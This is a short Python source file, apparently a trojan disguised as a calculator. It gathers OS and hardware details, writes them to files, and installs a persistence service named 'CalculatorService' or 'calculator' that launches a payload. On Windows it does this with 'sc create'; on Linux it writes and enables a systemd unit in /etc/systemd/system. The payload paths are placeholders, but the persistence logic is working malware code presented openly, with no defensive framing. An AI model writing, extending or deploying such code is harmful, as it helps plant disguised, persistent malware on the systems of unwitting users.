import os
import platform
import subprocess

def collect_system_info() -> str:
    system_info = f"OS: {platform.system()} {platform.release()}\n"
    system_info += f"Architecture: {platform.architecture()[0]}\n"
    system_info += f"Machine: {platform.machine()}\n"
    system_info += f"Processor: {platform.processor()}\n"
    return system_info

def write_to_file(file_path: str, content: str) -> None:
    with open(file_path, 'w') as file:
        file.write(content)

def create_persistence_service() -> None:
    if platform.system() == "Windows":
        subprocess.run(["sc", "create", "CalculatorService", "binPath=", "C:\\path\\to\\payload.exe"])
    elif platform.system() == "Linux":
        with open('/etc/systemd/system/calculator.service', 'w') as service_file:
            service_file.write('[Unit]\nDescription=Calculator Service\n')
            service_file.write('[Service]\nExecStart=/usr/bin/payload\n')
            service_file.write('[Install]\nWantedBy=multi-user.target\n')
        subprocess.run(["systemctl", "enable", "calculator"])

def trojan_fake_calculator(file_path: str) -> None:
    system_info = collect_system_info()
    write_to_file('system_info.txt', system_info)
    write_to_file(file_path, system_info)
    create_persistence_service()
